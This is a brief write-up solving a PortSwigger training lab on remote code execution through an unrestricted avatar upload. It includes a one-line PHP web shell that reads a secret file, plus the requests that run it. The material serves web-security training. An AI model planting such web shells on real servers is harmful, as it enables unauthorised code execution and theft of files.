# Lab 01 — Remote code execution via web shell upload

> **Practitioner** · [Official lab](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

**Entry point:** avatar upload served from `/files/avatars/` and **executed**
as PHP.

## Solution

1. Upload any image; note `GET /files/avatars/<image>`.
2. Upload `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

3. `GET /files/avatars/exploit.php` — the script executes and returns
   carlos's secret — submit it — lab solved.
